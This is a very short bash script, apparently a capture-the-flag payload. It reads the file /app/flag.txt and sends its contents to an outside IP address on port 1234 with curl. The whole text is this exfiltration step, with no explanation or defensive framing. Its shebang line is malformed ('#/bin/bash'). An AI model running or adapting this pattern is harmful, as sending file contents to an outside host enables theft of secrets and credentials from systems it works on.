#/bin/bash

PATH=$(cat /app/flag.txt)
/usr/bin/curl http://15.237.112.93:1234/$PATH
